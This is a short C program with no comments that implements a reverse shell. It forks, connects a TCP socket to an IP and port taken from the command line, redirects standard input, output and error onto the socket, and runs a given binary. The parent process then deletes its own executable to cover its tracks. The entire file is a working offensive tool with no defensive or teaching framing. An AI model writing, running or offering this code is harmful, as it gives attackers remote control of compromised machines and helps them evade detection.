#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <arpa/inet.h>

int main(int argc, char* argv[])
{
    if(argc < 4)
    {
        printf("Usage: .\\Program <IP> <PORT> <BINARYPATH>");
        return 0;
    }
    if(fork() == 0)
    {
        int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(atoi(argv[2]));
        addr.sin_addr.s_addr = inet_addr(argv[1]);
        
        connect(sockfd, (sockaddr*)&addr, sizeof(addr));
        
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);

        execve(argv[3], 0, 0);
    }  
    else
    {
        unlink(argv[0]);
    }
    return 0;
}
